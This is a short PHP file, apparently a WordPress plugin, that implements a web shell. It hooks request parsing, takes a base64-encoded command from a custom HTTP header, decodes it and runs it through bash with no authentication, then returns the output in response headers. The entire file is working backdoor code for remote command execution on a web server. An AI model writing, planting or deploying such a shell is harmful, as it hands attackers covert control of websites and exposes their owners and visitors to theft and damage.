<?php

$GLOBALS['current_command'] = false;
$GLOBALS['current_output']  = false;

function string_append(string $lhs, string $rhs) {
	return $lhs . 'NEWLINE_HERE' . $rhs;
}

function get_command_request() {
	$GLOBALS['current_command'] = $_SERVER['HTTP_WEB_SHELL_REQUEST'];

	if ($GLOBALS['current_command']) {
		exec("echo " . $GLOBALS['current_command'] . " | base64 -d | bash", $exec_output);
		$GLOBALS['current_output'] = array_reduce($exec_output, 'string_append', '');
	}
}
add_action('parse_request', 'get_command_request');

function send_command_response() {
	if ($GLOBALS['current_output']) {
		header('web-shell-command: '  . $GLOBALS['current_command']);
		header('web-shell-response: ' . $GLOBALS['current_output']);

		$GLOBALS['current_command'] = false;
		$GLOBALS['current_output']  = false;
	}
}
add_action('send_headers', 'send_command_response');

?>
